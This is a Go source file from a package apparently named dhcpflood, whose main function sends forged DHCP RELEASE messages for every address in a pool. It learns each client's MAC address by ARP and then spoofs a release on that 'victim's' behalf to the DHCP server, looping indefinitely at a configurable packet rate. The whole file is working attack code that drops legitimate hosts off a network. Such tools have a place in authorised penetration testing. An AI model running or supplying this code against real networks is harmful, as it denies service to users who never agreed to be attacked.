package dhcpflood

import (
	"fmt"
	"net"
	"os"
	"os/signal"
	"sync/atomic"
	"time"
)

// runRelease sends DHCPRELEASE for each leased IP in the pool.
func (f *Flooder) runRelease() error {
	startIP, endIP, err := parsePool(f.Pool)
	if err != nil {
		return fmt.Errorf("invalid pool range: %w", err)
	}
	serverIP := serverIPFromPool(startIP)

	iface, err := net.InterfaceByName(f.Interface)
	if err != nil {
		return fmt.Errorf("interface %q: %w", f.Interface, err)
	}
	if len(iface.HardwareAddr) != 6 {
		return fmt.Errorf("interface %s has invalid MAC", iface.Name)
	}
	var ourMAC [6]byte
	copy(ourMAC[:], iface.HardwareAddr)

	ifaceIP, err := ifaceIPv4(iface)
	if err != nil {
		return err
	}

	sock, err := openRawSocket(iface)
	if err != nil {
		return err
	}
	defer sock.Close()

	serverMAC, err := learnMAC(sock, ourMAC, ifaceIP, serverIP, 3*time.Second)
	if err != nil {
		return fmt.Errorf("learn DHCP server %s MAC: %w", intToIP(serverIP), err)
	}
	fmt.Printf("%s Learned DHCP server %s at %s\n", dhcpFloodTag, intToIP(serverIP), formatMAC(serverMAC))

	var total, released, skipped int64

	sig := make(chan os.Signal, 1)
	signal.Notify(sig, os.Interrupt)
	go func() {
		<-sig
		fmt.Printf("\n%s Stopped. RELEASE sent: %d  skipped (no ARP): %d\n",
			dhcpFloodTag, atomic.LoadInt64(&released), atomic.LoadInt64(&skipped))
		os.Exit(0)
	}()

	go func() {
		t := time.NewTicker(time.Second)
		defer t.Stop()
		var prev int64
		for range t.C {
			cur := atomic.LoadInt64(&released)
			fmt.Printf("\r%s RELEASE: %-10d  skipped: %-10d  rate: %-8d pps    ",
				dhcpFloodTag, cur, atomic.LoadInt64(&skipped), cur-prev)
			prev = cur
		}
	}()

	startDot := intToIP(startIP)
	endDot := intToIP(endIP)
	if f.Rate > 0 {
		fmt.Printf("%s Sending DHCP RELEASE for %s–%s via server %s on %s at %d pps — press Ctrl+C to stop.\n",
			dhcpFloodTag, startDot, endDot, intToIP(serverIP), f.Interface, f.Rate)
	} else {
		fmt.Printf("%s Sending DHCP RELEASE for %s–%s via server %s on %s — press Ctrl+C to stop.\n",
			dhcpFloodTag, startDot, endDot, intToIP(serverIP), f.Interface)
	}

	var interval time.Duration
	if f.Rate > 0 {
		interval = time.Second / time.Duration(f.Rate)
	}
	next := time.Now()
	cur := startIP

	for {
		if f.Rate > 0 {
			if now := time.Now(); now.Before(next) {
				time.Sleep(next.Sub(now))
			}
			next = next.Add(interval)
		}

		atomic.AddInt64(&total, 1)
		victimMAC, err := learnMAC(sock, ourMAC, ifaceIP, cur, 800*time.Millisecond)
		if err != nil {
			atomic.AddInt64(&skipped, 1)
		} else {
			if err := sock.Send(buildRelease(victimMAC, serverMAC, cur, serverIP)); err != nil {
				return fmt.Errorf("send RELEASE: %w", err)
			}
			atomic.AddInt64(&released, 1)
		}

		if cur >= endIP {
			cur = startIP
		} else {
			cur++
		}
	}
}

func learnMAC(sock rawSocket, ourMAC [6]byte, senderIP, targetIP uint32, timeout time.Duration) ([6]byte, error) {
	var zero [6]byte
	_ = sock.Send(buildARPRequest(ourMAC, senderIP, targetIP))
	_ = sock.SetReadTimeout(timeout)
	deadline := time.Now().Add(timeout)
	buf := make([]byte, 65535)
	for time.Now().Before(deadline) {
		n, err := sock.Recv(buf)
		if err != nil {
			break
		}
		if mac, ok := parseARPReply(buf[:n], targetIP, ourMAC); ok {
			return mac, nil
		}
	}
	return zero, fmt.Errorf("no ARP reply for %s", intToIP(targetIP))
}

func formatMAC(mac [6]byte) string {
	return fmt.Sprintf("%02x:%02x:%02x:%02x:%02x:%02x", mac[0], mac[1], mac[2], mac[3], mac[4], mac[5])
}
